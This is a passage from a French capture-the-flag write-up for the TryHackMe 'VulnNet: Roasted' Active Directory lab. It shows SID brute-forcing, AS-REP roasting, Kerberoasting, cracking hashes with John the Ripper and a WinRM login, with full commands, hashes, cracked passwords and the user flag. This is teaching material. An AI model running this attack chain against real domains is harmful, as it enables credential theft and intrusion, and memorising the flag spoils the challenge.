</span></span><span class="line"><span class="ln">70</span><span class="cl"><span class="o">[</span>-<span class="o">]</span> Could not establish random user session: timed out
</span></span><span class="line"><span class="ln">71</span><span class="cl"><span class="o">[</span>-<span class="o">]</span> Sessions failed, neither null nor user sessions were <span class="nv">possible</span>
</span></span><span class="line"><span class="ln">72</span><span class="cl">
</span></span><span class="line"><span class="ln">73</span><span class="cl"> <span class="o">===============================================</span>
</span></span><span class="line"><span class="ln">74</span><span class="cl"><span class="p">|</span>    OS Information via RPC <span class="k">for</span> 10.10.211.33    <span class="p">|</span>
</span></span><span class="line"><span class="ln">75</span><span class="cl"> <span class="o">===============================================</span>
</span></span><span class="line"><span class="ln">76</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Enumerating via unauthenticated SMB session on 445/tcp
</span></span><span class="line"><span class="ln">77</span><span class="cl"><span class="o">[</span>+<span class="o">]</span> Found OS information via SMB
</span></span><span class="line"><span class="ln">78</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Enumerating via <span class="s1">&#39;srvinfo&#39;</span>
</span></span><span class="line"><span class="ln">79</span><span class="cl"><span class="o">[</span>-<span class="o">]</span> Skipping <span class="s1">&#39;srvinfo&#39;</span> run, not possible with provided credentials
</span></span><span class="line"><span class="ln">80</span><span class="cl"><span class="o">[</span>+<span class="o">]</span> After merging OS information we have the following result:
</span></span><span class="line"><span class="ln">81</span><span class="cl">OS: Windows 10, Windows Server 2019, Windows Server <span class="m">2016</span>
</span></span><span class="line"><span class="ln">82</span><span class="cl">OS version: <span class="s1">&#39;10.0&#39;</span>
</span></span><span class="line"><span class="ln">83</span><span class="cl">OS release: <span class="s1">&#39;1809&#39;</span>
</span></span><span class="line"><span class="ln">84</span><span class="cl">OS build: <span class="s1">&#39;17763&#39;</span>
</span></span><span class="line"><span class="ln">85</span><span class="cl">Native OS: not supported
</span></span><span class="line"><span class="ln">86</span><span class="cl">Native LAN manager: not supported
</span></span><span class="line"><span class="ln">87</span><span class="cl">Platform id: null
</span></span><span class="line"><span class="ln">88</span><span class="cl">Server type: null
</span></span><span class="line"><span class="ln">89</span><span class="cl">Server <span class="nb">type</span> string: null
</span></span><span class="line"><span class="ln">90</span><span class="cl">
</span></span><span class="line"><span class="ln">91</span><span class="cl"><span class="o">[</span>!<span class="o">]</span> Aborting remainder of tests since sessions failed, rerun with valid credentials
</span></span><span class="line"><span class="ln">92</span><span class="cl">
</span></span><span class="line"><span class="ln">93</span><span class="cl">Completed after 60.57 seconds
</span></span></code></pre></div><p>Les informations obtenues sont les suivantes:</p>
<ul>
<li><strong>Nom de l&rsquo;ordinateur NetBIOS:</strong> WIN-2BO8M1OE1M1</li>
<li><strong>Nom de domaine NetBIOS:</strong> VULNNET-RST</li>
<li><strong>Domaine DNS:</strong> vulnnet-rst.local</li>
<li><strong>FQDN:</strong> WIN-2BO8M1OE1M1.vulnnet-rst.local</li>
<li><strong>OS:</strong> Windows 10, Windows Server 2019, Windows Server 2016</li>
<li><strong>Version de l&rsquo;OS:</strong> 10.0</li>
</ul>
<p>Une fois ça fais on peux regarder les SID du domaine avec <code>rpcclient</code>:</p>
<p>C&rsquo;set quoi un SID ?
Le SID (Security Identifier) est un identifiant unique attribué à chaque compte utilisateur, groupe ou ordinateur dans un domaine Active Directory. Il est utilisé pour identifier de manière unique un objet ou une entité dans un domaine Active Directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">[</span>May 12, <span class="m">2024</span> - 11:47:35 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c1"># lookupsid.py guest@10.10.211.33</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Impacket <span class="k">for</span> Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright <span class="m">2022</span> Fortra - forked by ThePorgs
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">Password:
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Brute forcing SIDs at 10.10.211.33
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> StringBinding ncacn_np:10.10.211.33<span class="o">[</span><span class="se">\p</span>ipe<span class="se">\l</span>sarpc<span class="o">]</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Domain SID is: S-1-5-21-1589833671-435344116-4136949213
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">498: VULNNET-RST<span class="se">\E</span>nterprise Read-only Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">500: VULNNET-RST<span class="se">\A</span>dministrator <span class="o">(</span>SidTypeUser<span class="o">)</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">501: VULNNET-RST<span class="se">\G</span>uest <span class="o">(</span>SidTypeUser<span class="o">)</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">502: VULNNET-RST<span class="se">\k</span>rbtgt <span class="o">(</span>SidTypeUser<span class="o">)</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">512: VULNNET-RST<span class="se">\D</span>omain Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">513: VULNNET-RST<span class="se">\D</span>omain Users <span class="o">(</span>SidTypeGroup<span class="o">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">514: VULNNET-RST<span class="se">\D</span>omain Guests <span class="o">(</span>SidTypeGroup<span class="o">)</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">515: VULNNET-RST<span class="se">\D</span>omain Computers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">516: VULNNET-RST<span class="se">\D</span>omain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">517: VULNNET-RST<span class="se">\C</span>ert Publishers <span class="o">(</span>SidTypeAlias<span class="o">)</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">518: VULNNET-RST<span class="se">\S</span>chema Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">519: VULNNET-RST<span class="se">\E</span>nterprise Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">520: VULNNET-RST<span class="se">\G</span>roup Policy Creator Owners <span class="o">(</span>SidTypeGroup<span class="o">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">521: VULNNET-RST<span class="se">\R</span>ead-only Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">522: VULNNET-RST<span class="se">\C</span>loneable Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">525: VULNNET-RST<span class="se">\P</span>rotected Users <span class="o">(</span>SidTypeGroup<span class="o">)</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">526: VULNNET-RST<span class="se">\K</span>ey Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">527: VULNNET-RST<span class="se">\E</span>nterprise Key Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">553: VULNNET-RST<span class="se">\R</span>AS and IAS Servers <span class="o">(</span>SidTypeAlias<span class="o">)</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">571: VULNNET-RST<span class="se">\A</span>llowed RODC Password Replication Group <span class="o">(</span>SidTypeAlias<span class="o">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">572: VULNNET-RST<span class="se">\D</span>enied RODC Password Replication Group <span class="o">(</span>SidTypeAlias<span class="o">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">1000: VULNNET-RST<span class="se">\W</span>IN-2BO8M1OE1M1$ <span class="o">(</span>SidTypeUser<span class="o">)</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">1101: VULNNET-RST<span class="se">\D</span>nsAdmins <span class="o">(</span>SidTypeAlias<span class="o">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">1102: VULNNET-RST<span class="se">\D</span>nsUpdateProxy <span class="o">(</span>SidTypeGroup<span class="o">)</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">1104: VULNNET-RST<span class="se">\e</span>nterprise-core-vn <span class="o">(</span>SidTypeUser<span class="o">)</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">1105: VULNNET-RST<span class="se">\a</span>-whitehat <span class="o">(</span>SidTypeUser<span class="o">)</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">1109: VULNNET-RST<span class="se">\t</span>-skid <span class="o">(</span>SidTypeUser<span class="o">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">1110: VULNNET-RST<span class="se">\j</span>-goldenhand <span class="o">(</span>SidTypeUser<span class="o">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">1111: VULNNET-RST<span class="se">\j</span>-leet <span class="o">(</span>SidTypeUser<span class="o">)</span>
</span></span></code></pre></div><p>BINGO ! On a des utilisateurs:</p>
<ul>
<li><strong>a-whitehat</strong></li>
<li><strong>enterprise-core-vn</strong></li>
<li><strong>j-goldenhand</strong></li>
<li><strong>j-leet</strong></li>
<li><strong>t-skid</strong></li>
</ul>

<h3 id="exploitation" data-numberify>Exploitation<a class="anchor ms-1" href="#exploitation"></a></h3>

<h4 id="as-rep-roasting" data-numberify>As-Rep Roasting<a class="anchor ms-1" href="#as-rep-roasting"></a></h4>
<p>C&rsquo;est quoi l&rsquo;As-Rep Roasting ?</p>
<p>L&rsquo;attaque AS-REP Roasting est une attaque contre les comptes Active Directory qui n&rsquo;ont pas l&rsquo;attribut UF_DONT_REQUIRE_PREAUTH défini. L&rsquo;attaque consiste à envoyer une demande de ticket Kerberos pour un utilisateur qui n&rsquo;a pas l&rsquo;attribut UF_DONT_REQUIRE_PREAUTH défini. L&rsquo;attaque est appelée &ldquo;roasting&rdquo; car l&rsquo;attaquant peut récupérer le hash du mot de passe de l&rsquo;utilisateur sans avoir besoin de déchiffrer le trafic réseau.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">[</span>May 12, <span class="m">2024</span> - 11:52:48 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c1"># GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip &#34;10.10.211.33&#34; &#34;vulnnet-rst.local&#34;/</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">Impacket <span class="k">for</span> Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright <span class="m">2022</span> Fortra - forked by ThePorgs
</span></span><span class="line"><span class="ln">3</span><span class="cl">
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="o">[</span>-<span class="o">]</span> User a-whitehat doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="s1">[-] User enterprise-core-vn doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="o">[</span>-<span class="o">]</span> User j-goldenhand doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="s1">[-] User j-leet doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="nv">$krb5asrep$23$t</span>-skid@VULNNET-RST.LOCAL:02349b9312c22cce838b122bbb4e6576<span class="nv">$247</span>f0fe80f8d9c3ced75694bf421006a815c89b6f98382b865582e42d4e4c248b36130f42f68de4c914c908c8c9adef2dc8173e8090d25b7bfec3bec292f64dd1ed1514415075d07399f13c3ca287be9c99e6b2a668fbfda658621cdb6ec13a81334e7acd95d261335b1f8454b1e8ab7f57996810fd98dbb65feeb0f706bf9652c8e304098ba05dc2fcb750b19487a66ea3689f67b1196efa17da808124ad220c623c2eb0f77d54e9304f3fb3346099e5f9e7d8fed0f3c5247d20d258dc25c8eb4455a6513b01399cfd6e7f24f332a9438b26fc6222977738773fcfeff4c63566f850dca6fc6cc72fd1df73d9e835d5218d63d615e19
</span></span></code></pre></div><p>On a récupéré le hash du mot de passe de l&rsquo;utilisateur <strong>t-skid</strong>.</p>

<h4 id="cracking" data-numberify>Cracking<a class="anchor ms-1" href="#cracking"></a></h4>
<p>On peut maintenant cracker le hash récupéré avec John The Ripper:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">[</span>May 12, <span class="m">2024</span> - 11:54:10 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c1"># john --wordlist=`fzf-wordlists` ASREProastables.txt</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos <span class="m">5</span> AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x<span class="o">])</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>etype<span class="o">)</span> is <span class="m">23</span> <span class="k">for</span> all loaded hashes
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">Will run <span class="m">8</span> OpenMP threads
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, <span class="s1">&#39;h&#39;</span> <span class="k">for</span> help, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">tj072889*        <span class="o">(</span><span class="nv">$krb5asrep$23$t</span>-skid@VULNNET-RST.LOCAL<span class="o">)</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">1g 0:00:00:01 DONE <span class="o">(</span>2024-05-12 11:54<span class="o">)</span> 0.6803g/s 2184Kp/s 2184Kc/s 2184KC/s tomaatjuh..tigris@livs
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class="line"><span class="ln">10</span><span class="cl">Session completed.
</span></span></code></pre></div><p>Le mot de passe de l&rsquo;utilisateur <strong>t-skid</strong> est <strong>tj072889</strong>.</p>

<h4 id="kerberoasting" data-numberify>Kerberoasting<a class="anchor ms-1" href="#kerberoasting"></a></h4>
<p>C&rsquo;est quoi le Kerberoasting ?</p>
<p>L&rsquo;attaque Kerberoasting est une attaque contre les comptes Active Directory qui ont l&rsquo;attribut servicePrincipalName défini. L&rsquo;attaque consiste à envoyer une demande de ticket Kerberos pour un utilisateur qui a l&rsquo;attribut servicePrincipalName défini. L&rsquo;attaque est appelée &ldquo;roasting&rdquo; car l&rsquo;attaquant peut récupérer le hash du mot de passe de l&rsquo;utilisateur sans avoir besoin de déchiffrer le trafic réseau.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">[</span>May 12, <span class="m">2024</span> - 12:03:25 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c1"># GetUserSPNs.py &#39;VULNNET-RST.local/t-skid:tj072889*&#39; -outputfile hashes -dc-ip 10.10.211.33</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Impacket <span class="k">for</span> Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright <span class="m">2022</span> Fortra - forked by ThePorgs
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">CIFS/vulnnet-rst.local  enterprise-core-vn  <span class="nv">CN</span><span class="o">=</span>Remote Management Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>vulnnet-rst,DC<span class="o">=</span><span class="nb">local</span>  2021-03-11 19:45:09.913979  2021-03-13 23:41:17.987528
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="o">[</span>-<span class="o">]</span> CCache file is not found. Skipping...
</span></span></code></pre></div><p>On a récupéré le hash du mot de passe de l&rsquo;utilisateur <strong>enterprise-core-vn</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">[</span>May 12, <span class="m">2024</span> - 12:03:42 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c1"># cat hashes</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nv">$krb5tgs$23$*</span>enterprise-core-vn<span class="nv">$VULNNET</span>-RST.LOCAL<span class="nv">$VULNNET</span>-RST.local/enterprise-core-vn*<span class="nv">$964</span>e72ce6bca5255ff16822ec093621b<span class="nv">$f4205c6f1560b7ccf8e41ea21919930a479b710eba5871ea2c2cae415115692801ce950513bfd01c8042faa4cdbe9cf01abfd13d8d593b6cf0125697dc69a482595497675584e7056b02ae92b49fe416a490103307191c092784c56c72ca18dedd843cd1568f085eaef37e4d107b346c6d4d03c9fc1e7c9b5c03f50d757a34d94f370b51fc841e61737520afd60eb4c2f94fde83c3e3773b1a4620051521c3045ea80c76181e2feb164c52bc6b8e8b5c20beb6cca6d7c12db081bf451c78f29ec884489ba4b58173877db82e862d1a1d2bf26f158f0d9c33badd596f181f37314beffefa60bd29f4da41aac80ff56f3eae5de78036f94aa552d91974c106c8609bc80cc81d5794172cd3bc56bb4da847d13cd320dd93343cb4743ab9f0907e79dea28fe5de0d9fb4fc0ea89dc514dd0b6d19915714b5b4d44cefaf859dd0afdcc1b6b11a666ecdc0a84c35d8116821570921f5ce236bba8225d77c52c0c06fab5c0dc5437cea9094af4cc37a550ecfdc4cb022589396f4cfdc7d3b559646b14a379df69656cd11213a155d95f47a220715c11061a3af33b81dfa836a3a7553874a5a936bea2dc9a284bcf2fcb5c582877dc9976d5d2d29ebbf84ea8853dc413512eb7d1dcf47b68b6ad17705b0b732c449ca9c4bb8801b63e90c825da161c0365211b4d4f54a6126b838f362c9b3d9ee234bb794021e6bf9645ff3ca0768885586d966d10ad540cffe06d18e617990a9b9f63c20c252cae2af2570e9a369d14debbcda58b768d274be8d3710c3fc8d497bfca1553fedf2017cfbf4808ac80a8a1b49961131af64dcb21ab0dfeb1b89b331b17e0349984a875039baf81cc1cc8e4d015c503ccc7065851b073ff1191413b763162bcca1588d1fca4db8830542eed9b561d376194183d078035ce74125b10c85841043cff5c2302965e55004810ca63d11260bab81ddc0456be7b2278b655dfd59683893dccdfc024c9cc0acb819dcf9f0cbafa29e8b22213a243451cfe902bf4051bd862ea80620c002502c9744dd143b11336782d9a2b815b17245faca22653b03c6367a9a36b22b312ba51e5e7bf1ef780a88d9e4c9f8bdf3ac58251c0199ff1dab58db3512c68a3ee3487f8142290f9ae2a9fc8d24faeadf204a8059f65288e929f78f09a57e8af2b2f2e0f13d222c339c58a23a5bbbca580a88d80c9055e2b39d7263e67ee16754fa788b3cca777354ccace352a664f45949aebf8492eb5996e765bbb266f418921e06a37bbcd234d2263999f9e029195bfe73421c1834f608d6f0efae2924478a8648a4c2d9af8481274e60f824c9ed022c501bf4e907c2318f88cf6119c8e15c205f51e283556aae05b2078411102b01e7d05fb09934d3c394846fcb03ceb730f4</span>
</span></span></code></pre></div>
<h4 id="cracking-1" data-numberify>Cracking<a class="anchor ms-1" href="#cracking-1"></a></h4>
<p>On peut maintenant cracker le hash récupéré avec John The Ripper:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">[</span>May 12, <span class="m">2024</span> - 12:03:49 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c1"># john --wordlist=`fzf-wordlists` hashes</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="ln">3</span><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos <span class="m">5</span> TGS-REP etype <span class="m">23</span> <span class="o">[</span>MD4 HMAC-MD5 RC4<span class="o">])</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">Will run <span class="m">8</span> OpenMP threads
</span></span><span class="line"><span class="ln">5</span><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, <span class="s1">&#39;h&#39;</span> <span class="k">for</span> help, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nv">ry</span><span class="o">=</span>ibfkfv,s6h,   <span class="o">(</span>?<span class="o">)</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">1g 0:00:00:01 DONE <span class="o">(</span>2024-05-12 12:04<span class="o">)</span> 0.8621g/s 3559Kp/s 3559Kc/s 3559KC/s sadeceben123..ruddle
</span></span><span class="line"><span class="ln">8</span><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class="line"><span class="ln">9</span><span class="cl">Session completed.
</span></span></code></pre></div><p>Parfait ! On a récupéré le mot de passe de l&rsquo;utilisateur <strong>enterprise-core-vn</strong> qui est <strong>ry=ibfkfv,s6h,</strong>.</p>

<h4 id="evil-winrm" data-numberify>Evil-WinRM<a class="anchor ms-1" href="#evil-winrm"></a></h4>
<p>Maintenant on peut se connecter à la machine avec Evil-WinRM:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">[</span>May 12, <span class="m">2024</span> - 12:06:27 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c1"># evil-winrm -i 10.10.211.33 -u &#39;enterprise-core-vn&#39; -p &#39;ry=ibfkfv,s6h,&#39;</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">Evil-WinRM shell v3.5
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\e</span>nterprise-core-vn<span class="se">\D</span>ocuments&gt; dir
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\e</span>nterprise-core-vn<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..
</span></span><span class="line"><span class="ln">10</span><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\e</span>nterprise-core-vn&gt; <span class="nb">cd</span> <span class="s2">&#34;C:/Users/enterprise-core-vn/Desktop/&#34;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\e</span>nterprise-core-vn<span class="se">\D</span>esktop&gt; <span class="nb">type</span> <span class="s2">&#34;C:/Users/enterprise-core-vn/Desktop/user.txt&#34;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">THM<span class="o">{</span>726b7c0baaac1455d05c827b5561f4ed<span class="o">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\e</span>nterprise-core-vn<span class="se">\D</span>esktop&gt;
</span></span></code></pre></div><p>On a récupéré le flag utilisateur <strong>THM{726b7c0baaac1455d05c827b5561f4ed}</strong>.</p>

<h3 id="escalade-de-privilèges" data-numberify>Escalade de privilèges<a class="anchor ms-1" href="#escalade-de-privilèges"></a></h3>

<h4 id="smb" data-numberify>SMB<a class="anchor ms-1" href="#smb"></a></h4>
<p>On peut maintenant regarder les partages SMB avec <code>smbmap</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">[</span>May 12, <span class="m">2024</span> - 12:14:43 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c1"># smbmap -H &#34;10.10.211.33&#34; -u &#39;enterprise-core-vn&#39; -p &#39;ry=ibfkfv,s6h,&#39;</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    ________  ___      ___  _______   ___      ___       __         _______
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">   /<span class="s2">&#34;       )|&#34;</span>  <span class="se">\ </span>   /<span class="s2">&#34;  ||   _  &#34;</span><span class="se">\ </span><span class="p">|</span><span class="s2">&#34;  \    /&#34;</span>  <span class="p">|</span>     /<span class="s2">&#34;&#34;</span><span class="se">\ </span>      <span class="p">|</span>   __ <span class="s2">&#34;\
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="s2">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="s2">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="s2">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="s2">   /&#34;</span> <span class="se">\ </span>  :<span class="o">)</span> <span class="p">|</span>.  <span class="se">\ </span>   /:  <span class="o">||</span>: <span class="p">|</span>_<span class="o">)</span>  :<span class="o">)</span><span class="p">|</span>.  <span class="se">\ </span>   /:  <span class="p">|</span> /   /  <span class="se">\ </span>  <span class="se">\ </span> /<span class="p">|</span>__/ <span class="se">\
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="se"></span>  <span class="o">(</span>_______/  <span class="p">|</span>___<span class="p">|</span><span class="se">\_</span>_/<span class="p">|</span>___<span class="p">|</span><span class="o">(</span>_______/ <span class="p">|</span>___<span class="p">|</span><span class="se">\_</span>_/<span class="p">|</span>___<span class="p">|</span><span class="o">(</span>___/    <span class="se">\_</span>__<span class="o">)(</span>_______<span class="o">)</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"> -----------------------------------------------------------------------------
</span></span><span class="line"><span class="ln">11</span><span class="cl"> SMBMap - Samba Share Enumerator v1.10.2 <span class="p">|</span> Shawn Evans - ShawnDEvans@gmail.com
</span></span><span class="line"><span class="ln">12</span><span class="cl">                     https://github.com/ShawnDEvans/smbmap
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Detected <span class="m">1</span> hosts serving SMB
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Established <span class="m">1</span> SMB connections<span class="o">(</span>s<span class="o">)</span> and <span class="m">1</span> authentidated session<span class="o">(</span>s<span class="o">)</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="o">[</span>+<span class="o">]</span> IP: 10.10.211.33:445	Name: vulnnet-rst.local   	Status: Authenticated
</span></span><span class="line"><span class="ln">18</span><span class="cl">	Disk                                                  	Permissions	Comment
</span></span><span class="line"><span class="ln">19</span><span class="cl">	----                                                  	-----------	-------
</span></span><span class="line"><span class="ln">20</span><span class="cl">	ADMIN$                                            	NO ACCESS	Remote Admin
</span></span><span class="line"><span class="ln">21</span><span class="cl">	C$                                                	NO ACCESS	Default share
</span></span><span class="line"><span class="ln">22</span><span class="cl">	IPC$                                              	READ ONLY	Remote IPC
</span></span><span class="line"><span class="ln">23</span><span class="cl">	NETLOGON                                          	READ ONLY	Logon server share
</span></span><span class="line"><span class="ln">24</span><span class="cl">	SYSVOL                                            	READ ONLY	Logon server share
</span></span><span class="line"><span class="ln">25</span><span class="cl">	VulnNet-Business-Anonymous                        	READ ONLY	VulnNet Business Sharing
</span></span><span class="line"><span class="ln">26</span><span class="cl">	VulnNet-Enterprise-Anonymous                      	READ ONLY	VulnNet Enterprise Sharing
</span></span></code></pre></div><p>On a deux partages SMB:</p>
<ul>
<li><strong>VulnNet-Business-Anonymous</strong></li>
<li><strong>VulnNet-Enterprise-Anonymous</strong></li>
</ul>
